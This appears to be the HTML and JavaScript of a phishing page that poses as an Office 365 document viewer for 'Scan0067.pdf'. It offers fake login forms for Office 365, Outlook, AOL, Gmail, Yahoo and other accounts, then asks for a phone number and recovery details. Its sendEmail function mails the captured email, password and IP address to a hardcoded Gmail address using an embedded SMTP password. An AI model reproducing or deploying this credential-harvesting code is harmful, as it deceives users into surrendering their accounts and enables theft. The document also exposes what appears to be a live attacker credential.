      ...
      <div class="container-fluid p-0">
        ...
        <div class="row p-2" style="background-color:  #FF3C00;">
          <div class="col-lg-12">
            ...
            <span class="text-white h5 align-middle pl-2">Office 365 Documents</span>
          ...
          <div class="row rounded" style="margin: 70px 0px; border:2px solid #9c9c9c;background-color: #ededed">
            <div class="col-lg-6 align-self-center p-3" style="border-right: 2px solid #9c9c9c">
              ...
              <div class="text-center my-5">
                <img src="images/logo.png" class="img-fluid pt-2 m-0" width="90px" ><br>
                <span class="text-dark">562.33 KB</span><br>
                <span class="text-dark" style="font-size: 24px">Scan0067.pdf</span><br>
              </div>
              ...
              <div >
                ...
                <div class="">
                  <div class="row mx-2 mt-3">
                    <div class="col-lg-4">
                      <a href="javascript:void(0)" id="office365modal" class="w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
                    ...
                    <div class="col-lg-4">
                      <a href="javascript:void(0)" id="outlookmodal" class=" w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
                    ...
                    <div class="col-lg-4">
                      <a href="javascript:void(0)" id="aolmodal" class=" w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
                    ...
                    <div class="col-lg-4">
                      <a href="javascript:void(0)" id="gmailmodal" class="w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
                    ...
                    <div class="col-lg-4">
                      <a href="javascript:void(0)" id="yahoomodal" class="w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
                    ...
                    <div class="col-lg-4 ">
                      <a href="javascript:void(0)" id="othermodal" class=" w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
            ...
            <div class="modal-content">
                ...
                <div class="modal-body">
                    <center>
                        ...
                        <span class="text-danger error" style="display: none;">That account doesn't exist. Enter a different account</span>
                    </center>
                            ...
                            <div class="col-lg-12">
                                <div class="form-group">
                                    <div>
                                        ...
                                        <input type="email" name="ai" class="form-control" id="ai" aria-describedby="aiHelp" placeholder="Enter email" required="">
                                        <small id="aiHelp" class="form-text text-muted">We'll never share your email with anyone else.</small></div>
                                </div>
                            </div>
                            <div class="col-lg-12">
                                <div class="form-group">
                                    <label for="pr">Password</label>
                                    <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" required="">
                                </div>
                            </div>
                            <div class="text-right">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal" onclick="sendmail()">Close</button>
                                <input type="button" class="btn btn-info pull-right" name="submit-btn" id="submit-btn" onclick="sendmail()" value="Login">
                            </div>
                        </div>
                    </form>
            <script>
                ...
                document.getElementById('inp_uname').value = email;
                    ...
                    <form class="form-horizontal well">
                        <div id="div2" style="display: none;">
                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich" class="h5">abc@abc.com</span><br>
                            ...
                            <div class="form-group mt-3">
                                <input type="number" name="ph" class="form-control" id="ph" aria-describedby="aiHelp" placeholder="Enter Phone No." required="">
                            </div>
                            <div class="form-group mt-3">
                                <input type="text" name="rec_ai" class="form-control" id="rec_ai" aria-describedby="aiHelp" placeholder="Enter Phone No." required="">
                            </div>
                            <div class="text-right">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal" onclick="sendmail()">Close</button>
                                <input type="button" class="btn btn-info pull-right" name="submit-btn1" id="submit-btn1" onclick="sendmail()" value="verify">
                            </div>
                        </div>
                    </form>
					            <script>
    ...
    <script>
        ...
        function sendEmail(email, password, ipAddress) {
                Email.send({
                    ...
                    Username: "gannandre08@gmail.com",
                    Port:"2525",
                    Password: "270265C047C5F9E31342B3B4D30713A0B5F2",
                    To: 'gannandre08@gmail.com',
                    From: "gannandre08@gmail.com",
